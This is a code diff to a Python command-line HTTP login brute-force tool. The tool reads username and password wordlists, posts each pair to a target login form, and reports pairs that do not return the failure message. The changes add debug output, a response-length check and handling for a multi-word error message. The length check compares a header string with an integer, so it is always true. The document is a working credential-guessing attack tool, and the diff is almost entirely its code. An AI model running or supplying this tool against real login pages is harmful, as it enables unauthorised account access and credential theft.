@@ -7,11 +7,14 @@ def http_bruteforce(target, ulabel, plabel, userfile, passfile, error, user=None
     # If we already know the username then only fuzz for password
     try:
         if passfile and user:
+
             with open(passfile, 'r') as f:
                 passwords = f.readlines()
+
             for password in passwords:
                 password = password.strip()
                 response = requests.post(target, data={ulabel:user, plabel:password})
+
                 if response.status_code == 200 and error not in response.text:
                     print(f'\033[92m [+]\033[0m {user} : ', password)
                     break
@@ -20,13 +23,18 @@ def http_bruteforce(target, ulabel, plabel, userfile, passfile, error, user=None
 
 
         elif password and userfile:
-            with open(userfile, 'r') as f:
+            # print(userfile)
+            # print(error)
+            with open(userfile, 'r', encoding='latin-1') as f:
                 username = f.readlines()
+                
             for user in username:
                 user = user.strip()
+                print(user,password)
                 response = requests.post(target, data={ulabel:user, plabel:password})
-                print(response.text)
-                if response.status_code == 200 and error not in response.text:
+                print(response.headers['Content-Length'])
+
+                if response.status_code == 200 and response.headers['Content-Length']!=329:
                     print(f'\033[92m [+]\033[0m {user} : ', password)
                     break
                 else:
@@ -43,6 +51,7 @@ def http_bruteforce(target, ulabel, plabel, userfile, passfile, error, user=None
                 for password in passwords:
                     password = password.strip()
                     response = requests.post(target, data={ulabel:user, plabel:password})
+                
                     
                     if response.status_code == 200 and error not in response.text:
                         print(f'\033[92m [+]\033[0m {user} : ', password)
@@ -62,7 +71,7 @@ def main():
     parser = argparse.ArgumentParser(description='HTTP Bruteforce')
 
     parser.add_argument('-t','--target', type=str, help='Target URL')
-    parser.add_argument('-e','--error', type=str, help='Error message for invalid login attempt')
+    parser.add_argument('--error', type=str, nargs='+', help='Error message for invalid login attempt')
     parser.add_argument('-userlabel', type=str, help='User label')
     parser.add_argument('-passlabel', type=str, help='Password label')
 
@@ -78,14 +87,16 @@ def main():
     if args.userfile:
         userfile = args.userfile.name
     else:
-        userfile = args.user
+        userfile = None
 
     if args.passfile:
         passfile = args.passfile.name
     else:
-        passfile = args.passw
+        passfile = None
 
-    http_bruteforce( args.target, args.userlabel, args.passlabel, userfile, passfile, args.error , args.user, args.passw)
+    error = ' '.join(args.error)
+    error = error[1:-1]
+    http_bruteforce( args.target, args.userlabel, args.passlabel, userfile, passfile, error , args.user, args.passw)
 
 if __name__ == '__main__':
     main()
